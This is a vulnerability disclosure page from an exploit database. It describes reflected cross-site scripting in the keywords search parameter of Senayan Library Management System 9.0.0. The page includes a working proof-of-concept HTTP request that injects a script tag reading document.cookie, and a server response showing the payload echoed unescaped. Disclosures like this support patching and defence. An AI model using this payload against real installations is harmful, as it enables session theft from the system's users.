---
title: Senayan Library Management System 9.0.0 Cross Site Scripting
url: https://cxsecurity.com/issue/WLB-2022120025
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-12-12
fetch_date: 2025-10-04T01:14:11.965767
---

# Senayan Library Management System 9.0.0 Cross Site Scripting

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Senayan Library Management System 9.0.0 Cross Site Scripting** **2022.12.11**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")** | |

## Title: Senayan Library Management System v9.0.0 a.k.a SLIMS 9
Multiple XSS-Reflected vulnerabilities
## Author: nu11secur1ty
## Date: 12.09.2022
## Vendor: https://slims.web.id/web/
## Software: https://github.com/slims/slims9\_bulian/releases/download/v9.0.0/slims9\_bulian-9.0.0.zip
## Reference: https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/slims.web.id/SLIMS-9.0.0
## Description:
The value of the keywords request parameter is copied into the value
of an HTML tag attribute which is encapsulated in double quotation
marks.
The payload m8vzl"><script>alert(hello\_vulnerability)</script>hidhc
was submitted in the keywords parameter.
This input was echoed unmodified in the application's response.
## STATUS: HIGH Vulnerability
[+] Payload:
```GET
GET /slims9\_bulian-9.0.0/index.php?search=search&keywords=m8vzl"><script>alert(document.cookie)</script>hidhc
HTTP/1.1
Host: pwnedhost.com
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107
Safari/537.36
Connection: close
Cache-Control: max-age=0
Cookie: SenayanMember=aoujjbpmorr1km0t1j9g5cnhju
Upgrade-Insecure-Requests: 1
Referer: http://pwnedhost.com/slims9\_bulian-9.0.0/index.php?search=search&keywords=wd4iuxeo08r8d72ubgugx0nc5fylp2k6o9l4h6ywn
Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="107", "Chromium";v="107"
Sec-CH-UA-Platform: Windows
Sec-CH-UA-Mobile: ?0
Content-Length: 0
```
[+] Response:
```HTTP/1
HTTP/1.1 200 OK
Date: Fri, 09 Dec 2022 06:23:20 GMT
Server: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.30
X-Frame-Options: SAMEORIGIN
X-Powered-By: PHP/7.4.30
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
X-XSS-Protection: 1; mode=block
Connection: close
Content-Type: text/html; charset=UTF-8
Content-Length: 29492
<!--
# ===============================
# Classic SLiMS Template
# ===============================
# @Author: Waris Agung Widodo
# @Email: ido.alit@gmail.com
# @Date: 2018-01-23T11:25:57+07:00
# @Last modified by: Waris Agung Widodo
# @Last modified time: 2019-01-03T11:25:57+07:00
-->
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Open Source Library Management System | Senayan</title>
<meta name="viewport" content="width=device-width,
initial-scale=1, shrink-to-fit=no">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
<meta http-equiv="Pragma" content="no-cache"/>
<meta http-equiv="Cache-Control" content="no-store, no-cache,
must-revalidate, post-check=0, pre-check=0"/>
<meta http-equiv="Expires" content="Sat, 26 Jul 1997 05:00:00 GMT"/>
<meta name="description" content="Open Source Library
Management System | Senayan">
<meta name="keywords" content="Open Source Library Management System">
<meta name="viewport" content="width=device-width,
height=device-height, initial-scale=1">
<meta name="generator" content="SLiMS 9 (Bulian)">
<meta name="theme-color" content="#000">
<meta property="og:locale" content="en\_US"/>
<meta property="og:type" content="book"/>
<meta property="og:title" content="Open Source Library Management
System | Senayan"/>
<meta property="og:description" content="Open Source Library
Management System"/>
<meta property="og:url"
content="//pwnedhost.com/slims9\_bulian-9.0.0/index.php?search=search&keywords=m8vzl"><script>alert(document.cookie)</script>hidhc"/>
```
## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/slims.web.id/SLIMS-9.0.0)
## Proof and Exploit:
[href](https://streamable.com/ac60v3)
## Time spent
`01:00:00`

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022120025)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top